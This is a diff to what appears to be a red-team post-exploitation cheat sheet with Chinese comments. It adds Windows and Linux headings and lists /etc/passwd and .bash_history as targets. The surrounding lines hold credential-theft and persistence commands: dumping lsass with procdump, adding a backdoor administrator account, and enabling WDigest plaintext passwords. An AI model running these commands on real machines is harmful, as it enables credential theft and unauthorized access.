@@ -7,6 +7,7 @@
   - procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 
 ```sh
+# -- windows
 arp -a
 ipconfig /all
 dir /a C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent
@@ -24,6 +25,10 @@ shell net user defaultuser1 123 /add && net localgroup administrators defaultuse
 netstat -lantp | grep ESTABLISHED # 关注sshd进程，即运维人员公司IP
 
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # 管理员登录可读明文
+
+# -- linux
+/etc/passwd
+/home/<username>/.bash_history
 ```
 
 - [查询数据库连接 IP 记录](./30_mssql_sqlserver.md#查询日志访问-ip数据库)
